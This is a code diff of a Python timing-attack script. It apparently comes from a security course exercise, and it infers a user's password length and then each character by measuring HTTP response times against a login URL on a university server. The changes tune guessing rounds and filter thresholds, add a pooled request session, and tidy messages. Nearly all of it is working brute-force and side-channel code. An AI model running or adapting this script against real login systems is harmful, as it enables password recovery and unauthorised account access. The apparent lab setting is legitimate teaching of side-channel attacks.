@@ -9,6 +9,7 @@ import concurrent.futures
 from numpy import mean, median, quantile
 
 ### TODO?: Student's T-Test
+### TODO? Start-over?
 
 # ███╗   ███╗██╗██╗     ███████╗███████╗████████╗ ██████╗ ███╗   ██╗███████╗     ██╗
 # ████╗ ████║██║██║     ██╔════╝██╔════╝╚══██╔══╝██╔═══██╗████╗  ██║██╔════╝    ███║
@@ -23,15 +24,21 @@ from numpy import mean, median, quantile
 URL = 'http://aoi.ise.bgu.ac.il/?user={}&password={}'
 ALL_CHARS = string.ascii_lowercase
 NUM_ROUNDS_PASSWD_LENGTH_GUESS = 10
-NUM_ROUNDS_PASSWD_GUESSING = 5
+NUM_ROUNDS_PASSWD_GUESSING = 3
 MAX_PASSWD_LENGTH = 32
 TIMEOUT = 20 # Seconds
 RETRY_LIMIT = 10
-DIFFICULTY = '3' # or None
-FILT_THRESH = 0.25 # What quntile of lowest measurements to remove before next measurement
+DIFFICULTY = None # or None
+FILT_THRESH = 0.4 # What quntile of lowest measurements to remove before next measurement
 
 if DIFFICULTY != None:
     URL = URL + '&difficulty=' + DIFFICULTY
+
+session = requests.Session()
+adapter = requests.adapters.HTTPAdapter(
+    pool_connections=100,
+    pool_maxsize=100)
+session.mount('http://', adapter)
 
 # ========================================================================================
 
@@ -62,9 +69,9 @@ def timing_attack(username):
 
 
 def is_done(username, passwd):
-    res = requests.get(URL.format(username, passwd), timeout=TIMEOUT)
+    res = session.get(URL.format(username, passwd), timeout=TIMEOUT)
     if res.text == '0':
-        return 'Wrong password'
+        return 'Wrong password, starting over...'
     if res.text == '1':
         return 'Great susccess!'
 
@@ -78,7 +85,7 @@ def get_passwd_length(username):
             length2time[length].append(rtt)
         length2time[length] = median(length2time[length]) # Take median
 
-    passwd_length = max(length2time.items(), key=operator.itemgetter(1))[0]
+    passwd_length = max(length2time.items(), key=operator.itemgetter(1))[0] # Key with max value
 
     return passwd_length
 
@@ -89,12 +96,6 @@ def brute_force_last(username, passwd):
             return next_char
     return '*' # Unknown
 
-# def get_rtt(username, passwd):
-#     trials = []
-#     for _ in range(NUM_ROUNDS_PASSWD_GUESSING):
-#         rtt, _ = send_request(username, passwd)
-#             trials.append(rtt)
-#         return median(trials)
 
 def get_rtts(username, passwd, i, char2AccRtt):
     for char in char2AccRtt.keys():
@@ -104,7 +105,6 @@ def get_rtts(username, passwd, i, char2AccRtt):
             rtt, _ = send_request(username, new_passwd)
             trials.append(rtt)
         char2AccRtt[char] = char2AccRtt[char] + median(trials)
-        eprint(f'{new_passwd}: {median(trials)}')
     return char2AccRtt
 
 
@@ -113,12 +113,12 @@ def send_request(username, passwd, limit=RETRY_LIMIT):
         eprint(f'Failed to get response for {RETRY_LIMIT} times, exiting...')
         exit(1)
     try:
-        res = requests.get(URL.format(username, passwd), timeout=TIMEOUT)
+        res = session.get(URL.format(username, passwd), timeout=TIMEOUT)
     except requests.exceptions.Timeout:
         eprint('Timeout limit exceeded, re-trying...')
         return send_request(username, passwd, limit-1)
     except requests.exceptions.ConnectionError:
-        eprint('Connection error limit occurred, re-trying...')
+        eprint('Connection error occurred, re-trying...')
         return send_request(username, passwd, limit-1)
     elapsed = res.elapsed.total_seconds()
     success = res.text
@@ -129,7 +129,6 @@ def infer_ith_char(username, i, passwd):
     char2AccRtt = {char:0 for char in ALL_CHARS}
     while len(char2AccRtt) > 1:
         char2AccRtt = get_rtts(username, passwd, i, char2AccRtt)
-        # eprint(char2AccRtt); eprint(' -> ')
         filt = quantile(list(char2AccRtt.values()), FILT_THRESH)
         char2AccRtt = {k:v for k,v in char2AccRtt.items() if v >= filt}
     
@@ -153,4 +152,4 @@ if __name__ == '__main__':
     start = time.time()
     timing_attack(username)
     end = time.time()
-    eprint(f'Finished in {(end-start)/60:.2f}, minutes')
+    eprint(f'Finished in {(end-start)/60:.2f} minutes')
